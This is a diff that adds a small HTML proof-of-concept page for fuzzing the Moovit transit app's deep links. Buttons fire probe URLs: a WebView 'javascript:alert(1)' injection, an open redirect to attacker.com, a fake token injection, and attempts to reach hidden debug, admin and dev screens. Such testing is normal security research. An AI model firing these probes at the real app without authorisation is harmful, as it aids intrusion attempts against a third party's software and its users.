@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Moovit Deep Link PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: system-ui, -apple-system, sans-serif; padding: 20px; }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            background: #007AFF;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        .header {
+            background: #f0f0f5;
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Moovit Deep Link Tester</h1>
+    <div class="header">
+        <p><strong>Bundle ID:</strong> com.tranzmate.tranzmate1</p>
+        <p><strong>Schemes:</strong> moovit://, tranzmate://</p>
+    </div>
+
+    <h2>Basic Open</h2>
+    <a href="moovit://" class="button">Open moovit://</a>
+    <a href="tranzmate://" class="button">Open tranzmate://</a>
+    <a href="moovitstore://" class="button">Open moovitstore://</a>
+
+    <h2>Common Attack Vectors (Fuzzing)</h2>
+    
+    <h3>Navigation & Actions</h3>
+    <a href="moovit://nearby" class="button">moovit://nearby</a>
+    <a href="moovit://navigate?dest_lat=32.0853&dest_lon=34.7818" class="button">Navigate (Tel Aviv)</a>
+    <a href="moovit://payment" class="button">moovit://payment</a>
+    <a href="moovit://profile" class="button">moovit://profile</a>
+    
+    <h3>XSS / Injection Attempts</h3>
+    <a href="moovit://webview?url=javascript:alert(1)" class="button">WebView Javascript Injection</a>
+    <a href="moovit://open?url=http://attacker.com" class="button">Open Redirect (http)</a>
+    <a href="moovit://?token=MALICIOUS_TOKEN" class="button">Token Injection</a>
+    
+    <h3>Bypass Attempts</h3>
+    <a href="moovit://debug" class="button">Debug Mode</a>
+    <a href="moovit://admin" class="button">Admin Panel</a>
+    <a href="moovit://dev" class="button">Dev Settings</a>
+
+    <script>
+        // Automatic fuzzing logger (console)
+        console.log("Moovit PoC Loaded");
+    </script>
+</body>
+</html>
